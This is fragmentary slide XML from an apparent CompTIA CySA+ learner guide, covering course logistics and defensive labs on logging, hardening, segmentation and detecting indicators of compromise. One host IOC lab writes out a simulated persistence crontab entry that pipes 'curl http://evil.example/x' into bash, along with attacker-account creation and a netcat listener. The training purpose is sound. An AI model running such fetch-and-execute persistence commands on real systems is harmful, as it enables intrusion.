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428" r:id="rId179"/>
    <p:sldId id="429" r:id="rId180"/>
    <p:sldId id="259" r:id="rId10"/>
    <p:sldId id="260" r:id="rId11"/>
    <p:sldId id="261" r:id="rId12"/>
    <p:sldId id="262" r:id="rId13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4" r:id="rId25"/>
    <p:sldId id="276" r:id="rId27"/>
    <p:sldId id="430" r:id="rId181"/>
    <p:sldId id="277" r:id="rId28"/>
    <p:sldId id="431" r:id="rId182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32" r:id="rId183"/>
    <p:sldId id="425" r:id="rId176"/>
    <p:sldId id="426" r:id="rId177"/>
    <p:sldId id="427" r:id="rId1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9.xml"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide18.xml"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide20.xml"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide22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Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide87.xml"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide88.xml"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide89.xml"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide90.xml"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide91.xml"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide92.xml"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide93.xml"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide94.xml"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide95.xml"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide96.xml"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide97.xml"/><Relationship Id="rId103" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide98.xml"/><Relationship Id="rId104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide99.xml"/><Relationship Id="rId105" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide100.xml"/><Relationship Id="rId106" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide101.xml"/><Relationship Id="rId107" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide102.xml"/><Relationship Id="rId108" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide103.xml"/><Relationship Id="rId109" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide104.xml"/><Relationship Id="rId110" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide105.xml"/><Relationship Id="rId111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide106.xml"/><Relationship Id="rId112" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide107.xml"/><Relationship Id="rId113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide108.xml"/><Relationship Id="rId114" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide109.xml"/><Relationship Id="rId115" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide110.xml"/><Relationship Id="rId116" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide111.xml"/><Relationship Id="rId117" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide112.xml"/><Relationship Id="rId118" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide113.xml"/><Relationship Id="rId119" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide114.xml"/><Relationship Id="rId120" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide115.xml"/><Relationship Id="rId121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide116.xml"/><Relationship Id="rId122" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide117.xml"/><Relationship Id="rId123" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide118.xml"/><Relationship Id="rId124" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide119.xml"/><Relationship Id="rId125" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide120.xml"/><Relationship Id="rId126" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide121.xml"/><Relationship Id="rId127" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide122.xml"/><Relationship Id="rId128" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide123.xml"/><Relationship Id="rId129" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide124.xml"/><Relationship Id="rId130" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide125.xml"/><Relationship Id="rId131" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide126.xml"/><Relationship Id="rId132" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide127.xml"/><Relationship Id="rId133" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide128.xml"/><Relationship Id="rId134" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide129.xml"/><Relationship Id="rId135" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide130.xml"/><Relationship Id="rId136" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide131.xml"/><Relationship Id="rId137" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide132.xml"/><Relationship Id="rId138" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide133.xml"/><Relationship Id="rId139" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide134.xml"/><Relationship Id="rId140" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide135.xml"/><Relationship Id="rId141" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide136.xml"/><Relationship Id="rId142" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide137.xml"/><Relationship Id="rId143" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide138.xml"/><Relationship Id="rId144" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide139.xml"/><Relationship Id="rId145" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide140.xml"/><Relationship Id="rId146" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide141.xml"/><Relationship Id="rId147" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide142.xml"/><Relationship Id="rId148" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide143.xml"/><Relationship Id="rId149" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide144.xml"/><Relationship Id="rId150" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide145.xml"/><Relationship Id="rId151" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide146.xml"/><Relationship Id="rId152" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide147.xml"/><Relationship Id="rId153" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide148.xml"/><Relationship Id="rId154" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide149.xml"/><Relationship Id="rId155" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide150.xml"/><Relationship Id="rId156" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide151.xml"/><Relationship Id="rId157" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide152.xml"/><Relationship Id="rId158" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide153.xml"/><Relationship Id="rId159" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide154.xml"/><Relationship Id="rId160" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide155.xml"/><Relationship Id="rId161" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide156.xml"/><Relationship Id="rId162" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide157.xml"/><Relationship Id="rId163" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide158.xml"/><Relationship Id="rId164" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide159.xml"/><Relationship Id="rId165" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide160.xml"/><Relationship Id="rId166" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide161.xml"/><Relationship Id="rId167" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide162.xml"/><Relationship Id="rId168" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide163.xml"/><Relationship Id="rId169" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide164.xml"/><Relationship Id="rId170" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide165.xml"/><Relationship Id="rId171" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide166.xml"/><Relationship Id="rId172" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide167.xml"/><Relationship Id="rId173" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide168.xml"/><Relationship Id="rId174" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide169.xml"/><Relationship Id="rId175" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide170.xml"/><Relationship Id="rId176" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide172.xml"/><Relationship Id="rId177" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide173.xml"/><Relationship Id="rId178" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide174.xml"/><Relationship Id="rId179" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide4.xml"/><Relationship Id="rId180" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide5.xml"/><Relationship Id="rId181" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide21.xml"/><Relationship Id="rId182" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide23.xml"/><Relationship Id="rId183" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1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4049211-CySAPlus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hyperlink" Target="https://exams.tertiaryinfotech.com/practice-exams/comptia" TargetMode="Externa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02920"/>
            <a:ext cx="1051560" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="cys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0327" y="457200"/>
            <a:ext cx="1234440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233172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LEARNER GUIDE · COURSE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110578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CompTIA Cybersecurity Analyst (CySA+)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2377440" cy="73152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Course Code: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55464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TSC: Cyber Risk Management (ICT-SNA-4007-1.1)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8464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59552"/>
            <a:ext cx="11057839" cy="320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r>
              <a:rPr>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Version v13  ·  Learner Guide Slides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It is mandatory to take the AM, PM and Assessment digital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It is mandatory to take the AM, PM and Assessment digital attendance for WSQ-funded courses.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656332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820924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trainer/administrator will display the digital attenda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150108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trainer/administrator will display the digital attendance QR code generated from the SSG portal.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31336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995928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Scan the QR code with your mobile phone camera and submit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325112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06340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5170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 minimum of 75% attendance is required to be eligible for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5500116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30352"/>
            <a:ext cx="82296" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="rect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512064"/>
            <a:ext cx="3657600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300" b="1">
                <a:solidFill>
                  <a:srgbClr val="5E6776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22960"/>
            <a:ext cx="5669280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44752"/>
            <a:ext cx="1092708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92224"/>
            <a:ext cx="3337560" cy="42062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92224"/>
            <a:ext cx="3337560" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="rect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86000"/>
            <a:ext cx="1572768" cy="1572768"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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670048"/>
            <a:ext cx="1572768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187952"/>
            <a:ext cx="2825496" cy="31089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736592"/>
            <a:ext cx="2697480" cy="58521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General Trainer template —</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr sz="1200" b="1">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>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179222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792224"/>
            <a:ext cx="73152" cy="5669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92024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220370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80" y="252374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26280" y="2523744"/>
            <a:ext cx="73152" cy="5669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265176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82312" y="293522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325526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6280" y="3255264"/>
            <a:ext cx="73152" cy="5669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82312" y="338328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82312" y="366674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398678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26280" y="3986784"/>
            <a:ext cx="73152" cy="5669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411480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439826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6280" y="471830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26280" y="4718304"/>
            <a:ext cx="73152" cy="5669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82312" y="484632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82312" y="512978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26280" y="544982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0" y="5449824"/>
            <a:ext cx="73152" cy="5669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2312" y="557784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82312" y="586130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30352"/>
            <a:ext cx="82296" cy="60350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512064"/>
            <a:ext cx="2926080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822960"/>
            <a:ext cx="5669280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435608"/>
            <a:ext cx="1088136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92224"/>
            <a:ext cx="3337560" cy="42062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92224"/>
            <a:ext cx="3337560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86000"/>
            <a:ext cx="1572768" cy="15727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670048"/>
            <a:ext cx="1572768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187952"/>
            <a:ext cx="2825496" cy="31089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736592"/>
            <a:ext cx="2825496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50" b="1">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Principal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983480"/>
            <a:ext cx="2971800" cy="25603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792224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792224"/>
            <a:ext cx="73152" cy="8961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2312" y="1975104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2212848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907792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2907792"/>
            <a:ext cx="73152" cy="8961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2312" y="3090672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3328416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PhD - specialises in AI, automation and software engineering.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26280" y="4023360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6280" y="4023360"/>
            <a:ext cx="73152" cy="8961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2312" y="4206240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7C3AED"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>DELIVERS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4443984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WSQ courses on AI agents, automation (n8n) and app development.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80" y="5138928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26280" y="5138928"/>
            <a:ext cx="73152" cy="8961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5321808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Arial"/>
              </a:rPr>
              <a:t>FOUNDER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5559552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526747"/>
            <a:ext cx="4636008" cy="21519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Incident-response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Your name and organisation /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Your name and organisation / role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56332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82092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Your experience with security operations and SOC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150108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Your experience with security operations and SOC tools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31336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What you want to get out of this CySA+ course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325112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What you want to get out of this CySA+ course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006340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5170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One security incident or tool you are curious about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5500116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One security incident or tool you are curious about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5435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8488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25615" y="2054352"/>
            <a:ext cx="566928" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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5615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9536" y="36941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5615" y="369417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5615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4567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9536" y="5334000"/>
            <a:ext cx="566928" cy="566928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25615" y="5334000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25615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4567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Days 1-2: Foundations and Vulnerability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50" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The course moves from foundations and hands-on tooling into incident response, reporting, revision and assessment.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5340096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534009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130551"/>
            <a:ext cx="512064" cy="51206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21407"/>
            <a:ext cx="428853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operations foundations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79191"/>
            <a:ext cx="4681728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attendance, trainer and learner introductions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Learning outcomes, Skills Framework and assessment briefing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1: Security Operations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1-10: logs, hardening, segmentation, packet capture, SIEM and malware triage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874519"/>
            <a:ext cx="5340096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874519"/>
            <a:ext cx="5340096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2130551"/>
            <a:ext cx="512064" cy="51206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121407"/>
            <a:ext cx="428853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679191"/>
            <a:ext cx="4681728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Day 1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2: Vulnerability Management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11-19: asset discovery, scanning, CVSS, KEV, remediation and reporting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Daily recap and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Days 3-5: Response, Reporting and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50" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The course moves from foundations and hands-on tooling into incident response, reporting, revision and assessment.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3493008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130551"/>
            <a:ext cx="512064" cy="51206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Incident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vulnerability-management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3: Incident Response and Management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20-25: Kill Chain, ATT&amp;CK, custody, forensics, containment and tabletop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874519"/>
            <a:ext cx="3493008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3712" y="2130551"/>
            <a:ext cx="512064" cy="51206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Reporting and communication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incident-response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4: Reporting and Communication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26-30: vulnerability reports, executive reports, metrics, compliance and lessons learned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874519"/>
            <a:ext cx="3493008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47888" y="2130551"/>
            <a:ext cx="512064" cy="51206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Revision and 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5904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guided revision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Practice exam review and Q&amp;A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Course feedback, TRAQOM survey and assessment digital attendance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Final assessment and submission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WSQ TSC: Cyber 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58697"/>
            <a:ext cx="4636008" cy="168807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Risk matrix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TSC Title: Cyber Risk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TSC Title: Cyber Risk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94436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310896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TSC Code: ICT-SNA-4007-1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43814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TSC Code: ICT-SNA-4007-1.1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5720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This course is aligned to the SkillsFuture Singapore (SSG)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90118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This course is aligned to the SkillsFuture Singapore (SSG) Skills Framework Technical Skills &amp; Competency (...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Knowledge (K)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K1 Cyber risk assessment techniques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K1 Cyber risk assessment techniques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656332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820924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K2 Security risks, threats and vulnerabilities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150108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K2 Security risks, threats and vulnerabilities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31336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995928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K3 Possible treatments of security risks, threats and vuln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325112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K3 Possible treatments of security risks, threats and vulnerabilities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06340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5170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K4 Required levels of confidentiality, integrity, privacy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5500116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K4 Required levels of confidentiality, integrity, privacy and personal data protection as well as privacy t...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Abilities (A)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A1 Develop cyber risk assessment techniques to identify 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A1 Develop cyber risk assessment techniques to identify security loopholes and weaknesses in the business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A2 Design cyber risk assessments by consolidating insights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A2 Design cyber risk assessments by consolidating insights from the business and various functions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A3 Identify cyber security risks, threats and vulnerabilit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A3 Identify cyber security risks, threats and vulnerabilities, and their impact on the organisation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A4 Identify possible treatments for cyber risks, threats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A4 Identify possible treatments for cyber risks, threats and vulnerabilities identified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A5 Implement endorsed treatment and measures to address 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A5 Implement endorsed treatment and measures to address security gaps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By the end of the course, learners will be able to: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By the end of the course, learners will be able to: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cyber security risks, threats, and vulnerabilitie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cyber security risks, threats, and vulnerabilities, and assess their impact on the organization.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Develop cyber risk assessments by consolidating insights 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Develop cyber risk assessments by consolidating insights from business to identify security gaps.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possible treatments for identified cyber risks, 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possible treatments for identified cyber risks, threats, and vulnerabilities.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Implement endorsed treatment measures to address security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Implement endorsed treatment measures to address security gaps and ensure data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1: Security Operations (33%)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OS &amp; software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OS &amp; software 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Indicators of malicious activity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Indicators of malicious activity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2: Vulnerability Management (30%)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97785"/>
            <a:ext cx="4636008" cy="2609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Endpoint inspection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Analysing scan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Analysing scan results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Exploitation with Metasploit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Exploitation with Metasploit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3: Incident Response and Management (20%)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 analysis for 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 analysis for IR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IR playbooks &amp; tabletop exercises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IR playbooks &amp; tabletop exercises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4: Reporting and Communication (17%)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27803"/>
            <a:ext cx="4636008" cy="17498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Vulnerability identification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421331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585923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915107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61334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52592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855110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301337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4465929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795113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241340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5405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735116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Stakeholder communication &amp; lessons learned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Place phones and other materials under the table or on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No photos or recording of assessment scripts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No discussion during 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No discussion during assessment.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black/blue pen for assessment (hard copies)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black/blue pen for assessment (hard copies). No liquid paper or correction tape.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Assessment scripts will be collected when the time is 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Assessment scripts will be collected when the time is up.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Written Assessment (SAQ) - 1 hour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Written Assessment (SAQ) - 1 hour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Case Study (CS) - 1 hour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Case Study (CS) - 1 hour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Assessment format: Open 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Assessment format: Open Book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Open book assessment ONLY includes Slides, Learner Guide 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Open book assessment ONLY includes Slides, Learner Guide or any approved materials.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 appeal process is available for learners assessed as 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 appeal process is available for learners assessed as Not Yet Competent.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Minimum attendance rate of 75% based on SSG Digital Attendance record.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2110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9270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13862" y="2313432"/>
            <a:ext cx="438912" cy="43891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3862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0438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3012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0172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4764" y="2313432"/>
            <a:ext cx="438912" cy="43891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04764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3915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1075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95667" y="2313432"/>
            <a:ext cx="438912" cy="43891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5667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2243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4817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21977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6569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86569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3145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846320"/>
            <a:ext cx="978408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0">
                <a:solidFill>
                  <a:srgbClr val="5B6372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Access your Learning &amp; Training Management System for materials, attendance and certificates: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481328"/>
            <a:ext cx="67665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700" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Use the GitHub repository to download lab files, review commands, and revisit examples after class.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12848"/>
            <a:ext cx="6446520" cy="9601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23744"/>
            <a:ext cx="59893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5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https://github.com/tertiarycourses/TGS-2024049211-CySAPlus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3730752"/>
            <a:ext cx="3401568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Option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Clone the repository:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr sz="1050" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>git clone &lt;course-repo-url&gt;.git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3730752"/>
            <a:ext cx="3401568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Option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Download a ZIP from GitHub:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr sz="1050" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Code &gt; Download ZIP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1312" y="3730752"/>
            <a:ext cx="3401568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Runs in browser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Most labs use the free Killercoda Ubuntu Playground, so learners can practise without local setup.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1 · 33%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33%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OS &amp; software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OS &amp; software security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Encryption &amp; active defence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Log Ingestion and Time Synchronization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0700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78508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64208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2011680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 this lab you will configure a centralised syslog collector with rsyslog and synchronise the system clock with chro...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25496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73152" cy="1207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081528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2676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3008376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355848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Killercoda Ubuntu Playground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9664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69664"/>
            <a:ext cx="73152" cy="1207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42569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66844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4352544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CySA+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700016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1.1 - Log ingestion, Time synchronization, Logging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ab3be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79" y="1600200"/>
            <a:ext cx="1087013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rsyslog and chrony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rsyslog is the default Linux syslog daemon.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rsyslog chrony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Verify time synchronization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Stratum field tells you how many hops to a reference clock.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chronyc tracking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Inspect the rsyslog configuration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main file routes messages by facility (auth, cron, kern, mail, daemon, local0–7) and severity (emerg, alert, crit, err, warning, notice, info,…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/etc/rsyslog.conf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logs at each severity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logger is the standard tool to inject a syslog message from the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logger -p user.info "lab1: info message"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a central collector (loopback test)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Edit /etc/rsyslog.d/10-collector.conf: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/etc/rsyslog.d/10-collector.conf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Confirm receiver is listening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should see rsyslogd bound to UDP/514.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ss -ulnp | grep :514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8 syslog severity levels and how to filter on them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8 syslog severity levels and how to filter on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inject messages with logger and follow them in /var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inject messages with logger and follow them in /var/log/syslog.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centralise logs over UDP/514 with rsyslog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centralise logs over UDP/514 with rsyslog.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Why time sync is required before correlation - and how to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Why time sync is required before correlation - and how to verify it with chronyc.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OS Hardening and System Process Inspection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audit a Linux host with lynis, enable kernel-level auditing with auditd, and inspect running processes, kernel modules, and hardware to spot deviations from a baseline. These are exam-blueprint skills under CySA+ 1.1 (Operating system concepts — system hardening, system processes, hardware…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hardening and audit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lynis is a free CIS-style hardening scanner.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lynis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Inspect the file structure and configuration locations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Cyber analysts must know where configuration lives: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 /etc | head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Enumerate processes (CySA+ "system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 unexpected parents — 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--forest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Inspect the hardware architecture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expects you to know x86_64 vs ARM, CPU virtualization flags, and how to read uname for kernel version (which CVEs depend on).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lscpu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Run a Lynis hardening audit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it finishes, scroll to Suggestions and Hardening index.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Enable auditd and watch a sensitive file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adds a watch, -p wa records writes and attribute changes, -k tags events with a key.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enable --now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quick hardening control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Disable an unused service and verify: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list-unit-files --state=enabled | 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Where Linux configuration, logs, and kernel tunables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Where Linux configuration, logs, and kernel tunables live.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enumerate processes, sockets, hardware, and kernel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enumerate processes, sockets, hardware, and kernel.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run a free CIS-style audit with lynis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run a free CIS-style audit with lynis.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write an auditd rule and read the resulting events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write an auditd rule and read the resulting events with ausearch.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Network Segmentation and Zero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build two isolated network "zones" using Linux network namespaces, then enforce a deny-by-default policy between them with iptables. This is a hands-on model of the segmentation, SDN, SASE, and Zero Trust concepts in CySA+ 1.1 (Network architecture, Segmentation, Zero trust).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c675dab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465" y="1600200"/>
            <a:ext cx="8170764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segmentation?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flat network lets ransomware pivot from any compromised host to every other.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two zones with network namespaces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Two isolated network stacks now share a wire.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add zone-a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Apply a deny-by-default policy in zone-b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Re-test from zone-a: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Allow only one explicit flow (Zero Trust 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Permit only SSH (TCP/22) from zone-a, and only an established response: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-A INPUT  -p tcp --dport 22 -s 10.10.1.1 -m conn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the model to CySA+ vocabulary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CySA+ concept | What you built | |---|---| | On-premises | Both namespaces on local host | | Network segmentation | Two namespaces with separate…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del zone-a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build two isolated network zones with ip netns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build two isolated network zones with ip netns.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iptables enforces a segmentation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iptables enforces a segmentation boundary.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a deny-by-default + per-flow allow list maps to Zero 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a deny-by-default + per-flow allow list maps to Zero Trust.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CySA+ vocabulary (segmentation, SASE, SDN, ZTNA) in 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CySA+ vocabulary (segmentation, SASE, SDN, ZTNA) in concrete commands.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Detecting Malicious Network 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generate and detect several network-based indicators of compromise: port scans, beaconing, unusual traffic spikes, and activity on unexpected ports. These are exam-blueprint items under CySA+ 1.2 (Network-related indicators of malicious activity).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nmap netcat-openbsd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Detect a port scan (scans/sweeps)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terminal 1, start a capture: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'tcp[tcpflags] &amp; (tcp-syn) != 0 and not tcp[tcpflags] &amp; tcp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Detect beaconing (regular C2 callbacks)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Beaconing is malware checking in with its command-and-control server on a regular cadence.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{1..6}; do curl -s -o /dev/null http://example.com; sleep 5; done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activity on an unexpected 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listener on an unusual port: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nc -l -p 31337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 traffic spike (bandwidth consumption)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Generate a burst of traffic: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{1..100}; do curl -s -o /dev/null http://example.com &amp; done; wait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irregular peer-to-peer / rogue device patterns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ARP sweeps reveal rogue devices and lateral-movement reconnaissance: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neigh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Clean up background jobs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2&gt;/dev/null; jobs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BPF filters for SYN-only packets to detecting scans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BPF filters for SYN-only packets to detecting scans.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Using tcpdump -ttt to spot beaconing intervals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Using tcpdump -ttt to spot beaconing intervals.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Identifying activity on unexpected ports with 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Identifying activity on unexpected ports with ss.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Recognising bandwidth spikes and ARP-based rogue device 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Recognising bandwidth spikes and ARP-based rogue device indicators.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Host-Based IOC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hunt host-level indicators of compromise: unauthorised processes, unauthorised scheduled tasks, new accounts, file-system anomalies, and abnormal CPU/memory consumption. These are exam-blueprint items under CySA+ 1.2 (Host-related, Application-related, and Other indicators).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16252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076" y="1600200"/>
            <a:ext cx="8343543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auditd procps psmisc inotify-tools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Baseline current state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cannot spot the abnormal without first knowing the normal.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&gt; /tmp/baseline_ps.txt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Simulate unauthorised user creation (Application-related: "Introduction of new accounts")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diff immediately surfaces the unauthorised account.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useradd -m attacker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 malicious scheduled task (Host-related: "Unauthorized scheduled tasks")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exactly what a persistence-stage attacker does.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(crontab -l 2&gt;/dev/null; echo "*/5 * * * * curl -s http://evil.example/x | bas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abnormal process / CPU consumption (Host-related: "Processor consumption")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CPU-burner that mimics a coinminer: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yes &gt; /dev/null &amp;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file-system anomalies (Host-related: "File system changes or anomalies")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Watch a sensitive directory for unexpected writes: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inotifywait -m -r -e create,modify,delete /etc 2&gt;/dev/null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Detect malicious processes via parent / command line (Host-related: "Malicious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reverse shell often has bash as a child of a network listener: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| awk '$3==1 &amp;&amp; $NF ~ /sh$/ {print}'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Detect unauthorised privilege escalation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Multiple UID-0 entries in /etc/passwd, new SUID binaries, or a flood of failed sudo attempts all qualify as "Unauthorized privileges".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'sudo|su\b' /var/log/auth.log | tail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value of a baseline before hunting.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detect new accounts, cron persistence, CPU abuse, file-system drops, suspicious process trees, and privilege escalation — each mapped to a CySA+ 1.2 indicator.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Packet Capture for Threat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capture live traffic with tcpdump, then perform analyst-level extraction with tshark: pulling HTTP host headers, DNS queries, and TLS SNI fields out of a pcap. These are exam-blueprint skills under CySA+ 1.3 (Packet capture — Wireshark, tcpdump).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a80adb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483" y="1600200"/>
